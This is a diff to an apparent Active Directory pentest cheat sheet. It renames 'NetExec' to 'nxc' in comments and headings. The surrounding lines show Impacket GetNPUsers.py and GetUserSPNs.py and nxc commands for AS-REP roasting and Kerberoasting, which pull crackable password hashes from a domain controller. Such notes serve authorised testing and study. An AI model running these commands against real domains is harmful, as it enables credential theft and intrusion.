@@ -47,7 +47,7 @@ You don't have creds, but you enumerated valid usernames (RID cycling, OSINT, nu
 # GetNPUsers -> Users with `No Pre-Authentication` required
 GetNPUsers.py '$DOMAIN/' -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
-# NetExec — needs anonymous LDAP bind to be allowed (rare on modern DCs),
+# nxc — needs anonymous LDAP bind to be allowed (rare on modern DCs),
 # otherwise use Scenario 2 with creds
 nxc ldap $DC_IP -u users.txt -p '' --asreproast as-rep.txt
 ```
@@ -70,7 +70,7 @@ You have any valid domain credential. This lets you ask LDAP _which_ accounts ar
 # Impacket — -request auto-finds DONT_REQ_PREAUTH accounts and roasts them
 GetNPUsers.py '$DOMAIN/user:Password123' -request -dc-ip $DC_IP -format hashcat -outputfile as-rep.txt
 
-# NetExec
+# nxc
 nxc ldap $DC_IP -u user -p 'Password123' --asreproast as-rep.txt
 ```
 
@@ -123,7 +123,7 @@ GetUserSPNs.py -no-preauth "asrep_user" -usersfile spn_targets.txt \
 - `spn_targets.txt` = candidate usernames that hold SPNs (you supply these).
 - Output = TGS-REP hashes to crack.
 
-### <span style="color:#50FA7B">Method 2 — NetExec</span>
+### <span style="color:#50FA7B">Method 2 — nxc</span>
 ```bash
 nxc ldap dc.$DOMAIN -u asrep_user -p '' --kerberoasting roasted.txt
 ```
